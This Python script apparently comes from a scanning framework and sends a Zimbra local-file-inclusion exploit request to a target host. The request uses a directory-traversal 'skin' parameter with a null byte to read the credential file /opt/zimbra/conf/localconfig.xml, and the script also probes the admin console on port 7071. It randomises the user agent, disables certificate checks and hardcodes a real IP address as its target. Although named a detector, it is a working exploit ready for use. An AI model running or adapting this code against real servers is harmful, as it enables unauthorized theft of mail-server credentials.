#!/usr/bin/python
#coding=utf-8
import requests
import urlparse
from requests.packages.urllib3.exceptions import *
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(SNIMissingWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)


from PackageThread.JobQueue import Job
from PackageHTTP.UserAgents import getRandomAgent

exploit_path = '/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00'


class JobZimbraLFIDetector(Job):
    def __init__(self, id, hostname, timeout = 5):
        Job.__init__(self, id)
        self.timeout = timeout
        self.hostname = hostname
        self.https_mgr_port = 7071
        self.description = hostname
        self.service_schema =''
    #优化为一个Session
    def do(self):
        try:
            uri_http = urlparse.urlunsplit(('http',self.description, exploit_path,'',''))
            uri_https = urlparse.urlunsplit(('https',self.description, exploit_path,'',''))
            uri_http_mgr = urlparse.urlunsplit(('http',('%s:%d' % (self.description, 7071)), '/zimbraAdmin/','',''))
            uri_https_mgr = urlparse.urlunsplit(('https',('%s:%d' % (self.description, 7071)), '/zimbraAdmin/','',''))
            headers = {'User-Agent':getRandomAgent()}
            self.result = {
                'http' : requests.Request('GET', uri_http ,headers=headers),
                'https' : requests.Request('GET', uri_https ,headers=headers),
                'http_mgr' : requests.Request('GET', uri_http_mgr ,headers=headers),
                'https_mgr' : requests.Request('GET', uri_https_mgr ,headers=headers)
            }

            http_session = requests.Session()

            for k, v in self.result.items():
                request = http_session.prepare_request(v)
                try:
                    self.result[k] = http_session.send(request,
                                                       timeout = self.timeout,
                                                       verify = False)
                except Exception as e:
                    self.result[k] = e

            '''
            #超时,连接重置判定
            cnt_exception = 0
            for k, v in self.result.items():
                if not isinstance(v, requests.Response):
                    cnt_exception = cnt_exception + 1

            if cnt_exception == len(self.result):
                self.is_timeout = True
                self.retry = 3
                raise Exception('time out or connection reset')
            '''
        except Exception as e:
            self.exception = e

        return Job.do(self)

if __name__ == '__main__':
    job = JobZimbraLFIDetector(id=1, hostname='104.36.17.52')
    job.do()
    print job.result